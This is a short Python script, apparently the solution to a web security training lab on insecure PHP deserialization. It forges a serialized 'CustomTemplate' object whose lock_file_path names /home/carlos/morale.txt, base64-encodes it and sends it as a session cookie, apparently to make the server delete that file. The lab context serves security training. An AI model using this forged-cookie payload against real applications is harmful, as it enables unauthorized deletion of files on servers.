import requests
import base64
import re
import sys
from urllib.parse import unquote

if len(sys.argv) != 2:
    print("Usage: python3 solution.py <url>")
    sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
my_acc = burp_url + '/my-account'

session = requests.Session()
formatted_string = f'O:14:"CustomTemplate":1:{{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}}'
base64_encoded_string = base64.b64encode(formatted_string.encode('utf-8')).decode('utf-8')
burp_cookies = {"session": base64_encoded_string}
response = session.get(my_acc, cookies=burp_cookies)
